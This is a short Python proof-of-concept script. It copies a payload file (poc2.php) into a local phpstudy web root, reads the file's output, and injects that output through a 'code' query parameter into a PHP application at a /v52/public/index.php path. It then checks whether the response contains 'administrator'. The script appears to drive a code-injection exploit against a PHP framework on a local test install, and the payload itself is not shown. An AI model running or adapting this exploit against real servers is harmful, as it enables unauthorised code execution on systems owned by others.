#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
desc:
author: huha
'''
import requests
with open ('poc2.php','rb') as f:
    bstr = f.read()
with open('D:\phpstudy\PHPTutorial\WWW\poc2.php','wb') as f:
    f.write(bstr)

r = requests.get("http://127.0.0.1/poc2.php",timeout=1)
code = r.content.decode()

url = 'http://localhost/v52/public/index.php'
payload = '/?code={}'.format(code)

r = requests.get(url+payload)
if 'administrator' in r.content.decode():
    print('OK!!!')